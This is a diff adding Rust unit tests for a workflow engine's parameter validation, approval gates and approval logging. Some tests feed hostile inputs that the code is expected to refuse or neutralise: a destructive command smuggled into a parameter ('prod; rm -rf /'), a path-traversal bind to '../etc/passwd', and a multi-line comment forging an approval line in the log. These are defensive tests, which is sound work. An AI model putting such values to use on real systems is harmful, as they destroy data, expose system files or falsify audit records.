+    fn refusal(r: Result<DagGraph>) -> String {
+        let e = r.err().expect("should be refused");
+        e.downcast_ref::<crate::models::ParameterInvalid>()
+            .unwrap_or_else(|| panic!("not a ParameterInvalid: {e}"))
+            .to_string()
+    }
+
+    #[test]
+    fn param_schema_is_enforced_when_a_run_is_triggered() {
+        // A workflow with a required, default-less parameter still saves...
+        DagGraph::from_yaml(SCHEMA_YAML).expect("authoring must not demand required values");
+
+        // ...but cannot be triggered without it, or with a value outside the rules.
+        assert_eq!(refusal(trigger(SCHEMA_YAML, &[])), "parameter 'stack' is required");
+        assert_eq!(
+            refusal(trigger(SCHEMA_YAML, &[("stack", "prod; rm -rf /")])),
+            "parameter 'stack' must match [a-z][a-z0-9-]{1,20}"
+        );
+        // The pattern must match the whole value, not a substring of it.
+        assert!(trigger(SCHEMA_YAML, &[("stack", "prod\n; x")]).is_err());
+        assert_eq!(
+            refusal(trigger(SCHEMA_YAML, &[("stack", "prod"), ("action", "destroy")])),
+            "parameter 'action' must be one of: plan, apply"
+        );
+
+        let g = trigger(SCHEMA_YAML, &[("stack", "prod"), ("action", "apply")]).unwrap();
+        assert_eq!(g.spec.tasks[0].command, ["echo", "prod", "apply"]);
+    }
+
+    #[test]
+    fn param_schema_leaves_existing_workflows_alone() {
+        // No schema: any override, including an empty one, is accepted as before.
+        let y = "name: w\nparameters: { env: dev }\ntasks:\n  - { name: a, command: [\"true\"] }\n";
+        trigger(y, &[("env", "anything at all"), ("extra", "")]).unwrap();
+        // Undeclared parameters are unconstrained even when a schema exists.
+        trigger(SCHEMA_YAML, &[("stack", "prod"), ("note", "hi there!")]).unwrap();
+    }
+
+    #[test]
+    fn a_malformed_param_schema_is_an_authoring_error() {
+        let bad = |schema: &str| {
+            let y = format!(
+                "name: w\nparameters: {{ a: x }}\nparam_schema:\n  {schema}\ntasks:\n  - {{ name: t, command: [\"true\"] }}\n"
+            );
+            DagGraph::from_yaml(&y).err().map(|e| e.to_string()).expect("should fail")
+        };
+        assert!(bad("b: { required: true }").contains("no matching entry under parameters"));
+        assert!(bad("a: { pattern: \"(\" }").contains("not a valid regex"));
+        assert!(bad("a: { enum: [x, x] }").contains("twice"));
+        assert!(bad("a: {}").contains("sets no rule"));
+        // A default that breaks its own rule is caught at save time too.
+        assert!(bad("a: { enum: [y, z] }").contains("must be one of"));
+    }
+
+    #[test]
+    fn concurrency_key_is_templated_and_needs_a_cap() {
+        let y = |extra: &str| {
+            format!(
+                "name: w\n{extra}parameters: {{ stack: prod }}\nconcurrency_key: \"apply-{{{{ stack }}}}\"\ntasks:\n  - {{ name: a, command: [\"true\"] }}\n"
+            )
+        };
+        let g = DagGraph::from_yaml(&y("max_active_runs: 1\n")).unwrap();
+        assert_eq!(g.spec.concurrency_key.as_deref(), Some("apply-prod"));
+        assert_eq!(
+            trigger(&y("max_active_runs: 1\n"), &[("stack", "dev")]).unwrap().spec.concurrency_key.as_deref(),
+            Some("apply-dev")
+        );
+        assert!(DagGraph::from_yaml(&y("")).err().unwrap().to_string().contains("needs max_active_runs"));
+        let unresolved = "name: w\nmax_active_runs: 1\nconcurrency_key: \"{{ nope }}\"\ntasks:\n  - { name: a, command: [\"true\"] }\n";
+        assert!(DagGraph::from_yaml(unresolved).err().unwrap().to_string().contains("no value"));
+    }
+
+    #[test]
+    fn binds_are_validated_and_templated() {
+        let g = DagGraph::from_yaml(
+            "name: w\nparameters: { stack: prod }\ntasks:\n  - { name: plan, command: [\"true\"] }\n  - { name: gate, type: approval, depends_on: [plan], binds: [\"plan/{{ stack }}.tfplan\"] }\n",
+        )
+        .unwrap();
+        assert_eq!(g.task_spec("gate").unwrap().binds, vec!["plan/prod.tfplan".to_string()]);
+
+        for (frag, want) in [
+            ("binds: [\"../etc/passwd\"]", "invalid binds entry"),
+            ("binds: [\"plan\"]", "invalid binds entry"),
+            ("binds: [\"a/b/c\"]", "invalid binds entry"),
+        ] {
+            let yaml = format!("name: w\ntasks:\n  - {{ name: gate, type: approval, {frag} }}\n");
+            let err = DagGraph::from_yaml(&yaml).err().expect("rejected").to_string();
+            assert!(err.contains(want), "{frag}: got {err}");
+        }
+        let err = DagGraph::from_yaml("name: w\ntasks:\n  - { name: a, command: [\"true\"], binds: [\"p/x\"] }\n")
+            .err()
+            .expect("rejected")
+            .to_string();
+        assert!(err.contains("not `type: approval`"), "got {err}");
+    }
+
+    /// The log is line-oriented and read as a merged stream beside other tasks, so a
+    /// comment that carries its own line breaks could forge a second "decision" line
+    /// (`approved by ... at ...`) that nobody made. The comment is free text bounded only by
+    /// length, so the line breaks have to be neutralised here, where every approve/reject
+    /// route and the timeout path share one formatter.
+    #[test]
+    fn approval_log_keeps_a_multiline_comment_to_its_own_line() {
+        let forged = "fine\nrejected by mallory at 1999-01-01T00:00:00Z\r\napproved by root at x";
+        let log = approval_log(true, Some("alice"), Some(forged), "2026-09-30T00:00:00Z");
+        assert_eq!(log.matches('\n').count(), 1, "one header line + one comment line: {log:?}");
+        assert!(!log.contains('\r'), "{log:?}");
+        assert!(log.starts_with("approved by alice at 2026-09-30T00:00:00Z\ncomment: fine"), "{log:?}");
+        // Nothing is lost: the breaks are visible escapes, so a reader can still tell the
+        // comment had several lines.
+        assert!(log.contains("fine\\nrejected by mallory"), "{log:?}");
+        // Only the decider's own line may start with a verdict.
+        assert_eq!(log.lines().filter(|l| l.starts_with("approved by") || l.starts_with("rejected by")).count(), 1);
+    }
+
+    #[test]
+    fn approval_log_shape_is_unchanged_for_ordinary_input() {
+        assert_eq!(
+            approval_log(false, Some("bob@example.com"), Some("  not yet  "), "T"),
+            "rejected by bob@example.com at T\ncomment: not yet",
+        );
+        assert_eq!(approval_log(true, None, None, "T"), "approved by unknown at T");
+        assert_eq!(approval_log(true, Some("timeout"), Some("   "), "T"), "approved by timeout at T", "a blank comment adds no line");
+    }
+
+    #[test]
+    fn approver_permits_matches_identity_and_group() {
+        let none: Vec<String> = vec![];
+        assert!(approver_permits(&none, "a@b.c", "s", &[]), "no list admits anyone");
+        let list = vec!["Alice@Example.com".to_string(), "group:Release".to_string()];
+        assert!(approver_permits(&list, "alice@example.com", "s", &[]));
+        assert!(approver_permits(&list, "", "alice@example.com", &[]), "subject is matched too");
+        assert!(approver_permits(&list, "bob@example.com", "s", &["release".to_string()]));
+        assert!(!approver_permits(&list, "mallory@example.com", "m", &["dev".to_string()]));
+        assert!(!approver_permits(&list, "", "", &[]), "an empty identity matches nothing");
     }
 
     #[test]
@@ -3113,7 +3866,9 @@ tasks:
     /// seam. The enterprise build accepts the same spec.
     #[test]
     fn defer_connection_is_gated_with_a_signpost() {
+        use crate::metrics::{signpost_hits, SignpostGate};
         let spec = "name: p\ntasks:\n  - { name: s, command: [x], defer: { kind: k, connection: prod-spark } }\n";
+        let before = signpost_hits(SignpostGate::DeferConnection);
         let parsed = DagGraph::from_yaml(spec);
 
         if cfg!(feature = "enterprise") {
@@ -3127,6 +3882,8 @@ tasks:
 
         let msg = parsed.err().expect("the open build refuses a named connection").to_string();
         assert!(msg.contains("prod-spark"), "names what was attempted: {msg}");
+        // Process-wide and shared with parallel tests: a rise, not a count.
+        assert!(signpost_hits(SignpostGate::DeferConnection) > before, "the refusal is counted");
         assert!(msg.contains("not in this build"), "names the gap: {msg}");
         assert!(
             msg.contains("#what-this-build-does-not-do"),
